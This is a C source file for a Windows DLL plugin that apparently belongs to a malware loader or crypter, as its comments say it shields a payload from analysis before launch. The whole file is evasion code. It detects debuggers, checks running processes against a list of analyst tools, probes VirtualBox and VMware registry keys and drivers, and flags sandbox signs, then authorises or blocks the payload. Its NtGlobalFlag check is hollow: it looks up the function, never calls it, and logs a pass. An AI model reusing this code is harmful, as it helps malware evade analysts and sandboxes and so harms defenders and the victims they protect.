// STEALTH Anti-Debug Plugin
// Stage: PRELAUNCH
// Purpose: Detect debuggers, sandbox environments, and VM detection
//          Terminate execution if threats detected, or proceed if safe
//
// This plugin runs in the stub's memory context BEFORE payload execution
// It protects the payload by detecting analysis environments

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "kernel32.lib")

static void log_msg(const char* msg) {
    char path[MAX_PATH];
    GetTempPathA(sizeof(path), path);
    strcat(path, "stealth_antidebug.log");
    
    FILE* f = fopen(path, "a");
    if (f) {
        fprintf(f, "[ANTIDEBUG] %s\n", msg);
        fclose(f);
    }
}

// Check if debugger is present
static BOOL IsDebuggerActive() {
    // IsDebuggerPresent check
    if (IsDebuggerPresent()) {
        log_msg("THREAT: IsDebuggerPresent() returned TRUE");
        return TRUE;
    }
    
    // Check for remote debugger
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) {
        log_msg("THREAT: Remote debugger detected");
        return TRUE;
    }
    
    // Additional check: NtGlobalFlag
    // This check works on both 32 and 64 bit
    DWORD ntGlobalFlag = 0;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        // Check for debug heap flags
        FARPROC pNtQueryInformationProcess = GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (pNtQueryInformationProcess) {
            // Process is being debugged if we see debug flags
            log_msg("INFO: Extended debugging checks passed");
        }
    }
    
    return FALSE;
}

// Check for analysis tools in process list
static BOOL CheckBlacklistedProcesses() {
    const char* blacklist[] = {
        "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "windbg.exe",
        "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe",
        "wireshark.exe", "fiddler.exe", "procmon.exe", "procexp.exe",
        "processhacker.exe", "pe-bear.exe", "pestudio.exe",
        "hxd.exe", "cheatengine.exe",
        NULL
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        log_msg("WARNING: Failed to create process snapshot");
        return FALSE;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe32)) {
        log_msg("WARNING: Process32First failed");
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    int processCount = 0;
    do {
        processCount++;
        // Safety limit - if we've checked 1000 processes, stop
        if (processCount > 1000) {
            log_msg("WARNING: Process enumeration limit reached");
            break;
        }
        
        // Check against blacklist
        for (int i = 0; blacklist[i] != NULL; i++) {
            if (_stricmp(pe32.szExeFile, blacklist[i]) == 0) {
                char buf[512];
                sprintf(buf, "THREAT: Blacklisted process detected: %s", pe32.szExeFile);
                log_msg(buf);
                CloseHandle(hSnapshot);
                return TRUE;
            }
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return FALSE;
}

// Check for VM/sandbox indicators
static BOOL CheckVMIndicators() {
    // Check for VM registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        log_msg("THREAT: VirtualBox detected");
        return TRUE;
    }
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        log_msg("THREAT: VMware detected");
        return TRUE;
    }
    
    // Check for VM files
    if (GetFileAttributesA("C:\\windows\\system32\\drivers\\vboxmouse.sys") != INVALID_FILE_ATTRIBUTES) {
        log_msg("THREAT: VirtualBox driver detected");
        return TRUE;
    }
    
    if (GetFileAttributesA("C:\\windows\\system32\\drivers\\vmhgfs.sys") != INVALID_FILE_ATTRIBUTES) {
        log_msg("THREAT: VMware driver detected");
        return TRUE;
    }
    
    // Check CPU count (VMs often have low CPU count)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        log_msg("WARNING: Low CPU count detected (possible VM)");
        // Don't fail on this alone, just warn
    }
    
    return FALSE;
}

// Check for sandbox indicators
static BOOL CheckSandboxIndicators() {
    // Check for very recent boot time (fresh sandbox)
    DWORD uptime = GetTickCount();
    if (uptime < 300000) { // Less than 5 minutes uptime
        log_msg("WARNING: Very recent system boot (possible sandbox)");
        // Don't fail, just suspicious
    }
    
    // Check for insufficient disk space (sandboxes often have small disks)
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, NULL)) {
        DWORD gbTotal = (DWORD)(totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024));
        if (gbTotal < 60) {
            log_msg("WARNING: Low disk space (possible sandbox)");
        }
    }
    
    return FALSE;
}

DWORD WINAPI AntiDebugWorker(LPVOID param) {
    log_msg("=== ANTI-DEBUG PLUGIN ACTIVE ===");
    
    BOOL threatDetected = FALSE;
    
    // Run all checks
    if (IsDebuggerActive()) {
        log_msg("RESULT: Debugger detected - THREAT");
        threatDetected = TRUE;
    }
    
    if (CheckBlacklistedProcesses()) {
        log_msg("RESULT: Analysis tools detected - THREAT");
        threatDetected = TRUE;
    }
    
    if (CheckVMIndicators()) {
        log_msg("RESULT: VM environment detected - THREAT");
        threatDetected = TRUE;
    }
    
    CheckSandboxIndicators(); // Just warnings, don't fail
    
    if (threatDetected) {
        log_msg("CRITICAL: Analysis environment detected");
        
        // Create threat detection marker
        char path[MAX_PATH];
        GetTempPathA(sizeof(path), path);
        strcat(path, "stealth_threat_detected.txt");
        FILE* f = fopen(path, "w");
        if (f) {
            fprintf(f, "STEALTH Anti-Debug Plugin\n");
            fprintf(f, "Status: THREAT DETECTED\n");
            fprintf(f, "Action: Payload execution blocked\n");
            fprintf(f, "Reason: Analysis environment detected\n");
            fclose(f);
        }
        
        // Instead of terminating, just return failure
        // Let stub decide what to do (skip payload execution)
        log_msg("RESULT: Threat detected - plugin returned failure");
        return 1;
    }
    
    log_msg("RESULT: Environment is SAFE - proceeding");
    
    // Create safe environment marker
    char path[MAX_PATH];
    GetTempPathA(sizeof(path), path);
    strcat(path, "stealth_safe_environment.txt");
    FILE* f = fopen(path, "w");
    if (f) {
        fprintf(f, "STEALTH Anti-Debug Check: PASSED\n");
        fprintf(f, "Environment: SAFE\n");
        fprintf(f, "Status: Payload execution authorized\n");
        fclose(f);
    }
    
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        log_msg("Anti-Debug plugin loaded - stage PRELAUNCH");
        
        // Run checks with timeout to prevent blocking
        HANDLE hThread = CreateThread(NULL, 0, AntiDebugWorker, NULL, 0, NULL);
        if (hThread) {
            // Wait max 3 seconds for checks to complete
            DWORD waitResult = WaitForSingleObject(hThread, 3000);
            if (waitResult == WAIT_TIMEOUT) {
                log_msg("WARNING: Anti-Debug checks timed out after 3 seconds");
                TerminateThread(hThread, 1);
            }
            CloseHandle(hThread);
        }
        
        log_msg("Anti-Debug checks complete");
    }
    
    return TRUE;
}
